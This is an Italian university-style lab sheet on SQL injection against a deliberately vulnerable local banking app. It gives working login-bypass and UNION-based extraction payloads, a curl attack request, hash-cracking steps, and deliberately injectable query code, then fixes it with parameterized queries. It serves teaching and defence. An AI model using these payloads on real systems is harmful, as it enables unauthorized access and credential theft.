# Laboratorio Capitolo 5 — SQL Injection

> **Prerequisito:** aver letto il Capitolo 5 della dispensa.
> **Tempo:** 90-120 minuti.
> **Obiettivo:** sfruttare due vulnerabilità SQL Injection di `BancaPiccola-vuln`, poi correggerle e verificare la chiusura.

---

## Setup

Dalla cartella `BancaPiccola-vuln/`, con ambiente virtuale attivo:

```bash
python app.py
```

Apri il browser su <http://127.0.0.1:5000>. **Tieni aperto anche il terminale**: ogni query SQL viene stampata in output col prefisso `[DEBUG SQL]`.

---

## Attacco 1 — Login bypass

### Obiettivo

Entrare come `admin` senza conoscere la password di `admin`.

### Istruzioni

1. Vai su <http://127.0.0.1:5000/login>
2. Inserisci nel campo **Username**:
   ```
   admin' --
   ```
   (virgolette singola, spazio, due trattini)
3. Nel campo **Password** inserisci qualsiasi cosa, per esempio `x`
4. Clicca "Accedi"

### Verifica

- Dovresti trovarti nella dashboard di `admin`, con accesso al link "Admin" in alto
- Nel terminale dovresti vedere la query stampata, simile a:
  ```
  [DEBUG SQL] SELECT id, username, ruolo FROM utenti
              WHERE username = 'admin' --' AND password = '...'
  ```
- Il `--` commenta tutto quello che viene dopo: la condizione `password = '...'` è ignorata

### Variante

Prova anche:

- Username: `' OR '1'='1' --`, password: qualsiasi → entra come primo utente (di solito admin perché ha id=1)
- Username: `mario' --`, password: qualsiasi → entra come mario senza conoscere la sua password

### Test con curl

```bash
curl -X POST -d "username=admin' --&password=x" \
     -c /tmp/cookie.txt -L \
     http://127.0.0.1:5000/login
```

Dovresti vedere nella risposta l'HTML della dashboard di admin.

---

## Attacco 2 — UNION-based per estrarre credenziali

### Obiettivo

Sfruttare l'endpoint di ricerca prodotti per esfiltrare la tabella `utenti` con gli hash delle password.

### Passo 1 — conferma della vulnerabilità

Nell'URL del browser, vai su:

```
http://127.0.0.1:5000/cerca?q='
```

(un singolo apice). La pagina mostra un errore SQL: conferma che il parametro `q` non è sanitizzato.

### Passo 2 — scopri il numero di colonne

Prova progressivamente:

```
http://127.0.0.1:5000/cerca?q=' ORDER BY 1 --
http://127.0.0.1:5000/cerca?q=' ORDER BY 2 --
http://127.0.0.1:5000/cerca?q=' ORDER BY 3 --
http://127.0.0.1:5000/cerca?q=' ORDER BY 4 --
http://127.0.0.1:5000/cerca?q=' ORDER BY 5 --
```

La query originale è `SELECT id, nome, descrizione, prezzo FROM prodotti WHERE ...`: ha **4 colonne**, quindi `ORDER BY 4` funziona e `ORDER BY 5` dà errore.

### Passo 3 — estrai la tabella utenti

```
http://127.0.0.1:5000/cerca?q=' UNION SELECT id, username, password, 0 FROM utenti --
```

Dovresti vedere nella pagina di ricerca tutti gli username e i loro hash MD5 della password. Prendi l'hash di `mario`:

```
482c811da5d5b4bc6d497ffa98491e38
```

### Passo 4 — cracca l'hash

L'hash è MD5 senza salt. Vai su <https://crackstation.net> (serve internet), incolla l'hash, risolvi la captcha. In pochi secondi vedrai:

```
482c811da5d5b4bc6d497ffa98491e38  md5  Not found
```

...oppure, se `mario123` è in una wordlist comune (lo è):

```
482c811da5d5b4bc6d497ffa98491e38  md5  mario123
```

Se CrackStation non lo trova, prova lo script Python del Lab 07 con una wordlist.

---

## Attacco 3 — Scoperta della struttura del DB

Se non sapessi in anticipo che esiste una tabella `utenti`, la scopriresti così:

```
http://127.0.0.1:5000/cerca?q=' UNION SELECT name, sql, 0, 0 FROM sqlite_master WHERE type='table' --
```

Questa query restituisce il nome e la `CREATE TABLE` di ogni tabella del database. In un database SQL Server, MySQL o PostgreSQL useresti rispettivamente `sys.tables`, `information_schema.tables`, ecc.

---

## Correzione

### Apri `app.py` e cerca

**Punto 1 — funzione `login()`:** trova la riga:

```python
query = (f"SELECT id, username, ruolo FROM utenti "
         f"WHERE username = '{username}' AND password = '{password_hash}'")
...
cur.execute(query)
```

**Sostituisci con:**

```python
cur.execute(
    "SELECT id, username, password, ruolo FROM utenti WHERE username = ?",
    (username,)
)
riga = cur.fetchone()
```

(E sposta la verifica della password al Lab 07 — qui per ora puoi confrontare `riga["password"] == password_hash`.)

**Punto 2 — funzione `cerca()`:** trova la riga:

```python
query = f"SELECT id, nome, descrizione, prezzo FROM prodotti WHERE nome LIKE '%{q}%'"
cur.execute(query)
```

**Sostituisci con:**

```python
cur.execute(
    "SELECT id, nome, descrizione, prezzo FROM prodotti WHERE nome LIKE ?",
    (f"%{q}%",)
)
```

Salva e riavvia l'app.

### Verifica

Rieseguí gli attacchi:

- Login con `admin' --` / qualsiasi password → "Credenziali errate"
- URL `/cerca?q=' UNION SELECT ...` → nessun risultato (la stringa è cercata letteralmente come testo del nome prodotto)

**Hai chiuso la SQL Injection**.

### Confronto con `BancaPiccola-secure`

```bash
diff -u ../BancaPiccola-vuln/app.py ../BancaPiccola-secure/app.py | grep -A3 -B3 "execute"
```

Confronta le tue correzioni con la versione di riferimento.

---

## Domande di riflessione (da consegnare)

1. Perché `admin' --` funziona mentre `admin` senza la parte `' --` non funzionerebbe?
2. Perché filtrare solo gli apici dall'input non basta a fermare la SQLi?
3. I placeholder `?` delle query parametrizzate, tecnicamente, non sono una "sostituzione testuale". Cosa fanno in realtà?
4. Se l'applicazione usasse PostgreSQL anziché SQLite, quale sarebbe la sintassi dei placeholder nel driver `psycopg2`?
